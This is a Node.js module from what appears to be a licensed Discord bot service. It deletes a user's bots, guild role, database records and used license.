const { queryParams } = require("./db");
const { autosecureMap } = require("../mainbot/handlers/botHandler");
const { roleid, guildid } = require("../config.json");
const { tablesforuser, tablesbotnumber } = require('./gettablesarray');
const { getUserBotNumbers } = require("../autosecure/utils/bot/configutils");
const destroybots = require('./destroybots')

async function deleteuser(client, user) {
  try {
    const botNumbers = await getUserBotNumbers(user);
    /// Delete bots
    const result = await destroybots(user);
    console.log(`${result.destroyed}/${result.total} destroyed!`);


    // Remove role
    try {
      const guild = await client.guilds.fetch(guildid);
      const member = await guild.members.fetch(user);
      await member.roles.remove(roleid);
      console.log(`Removed role from user ${user}`);
    } catch (roleError) {
      console.error('Error removing role:', roleError);
    }

    // Get all tables
    const allTables = tablesforuser();
    const botTables = tablesbotnumber();
    const regularTables = allTables.filter(table => !botTables.includes(table));

    // Delete from bot tables
    for (const table of botTables) {
      const column = (table === "blacklisted" || table === "blacklistedemails") ? "client_id" : "user_id";

      for (const botnumber of botNumbers) {
        await queryParams(
          `DELETE FROM ${table} WHERE ${column} = ? AND botnumber = ?`,
          [user, botnumber]
        );
      }
    }

    // Delete from regular tables (no botnumber)
    for (const table of regularTables) {
      const column = (table === "blacklisted" || table === "blacklistedemails") ? "client_id" : "user_id";
      await queryParams(`DELETE FROM ${table} WHERE ${column} = ?`, [user]);
    }

    // Remove used license
    await queryParams(`DELETE FROM usedLicenses WHERE user_id = ?`, [user]);

  } catch (error) {
    console.error('Error deleting user data:', error);
    throw error;
  }
}

module.exports = deleteuser;
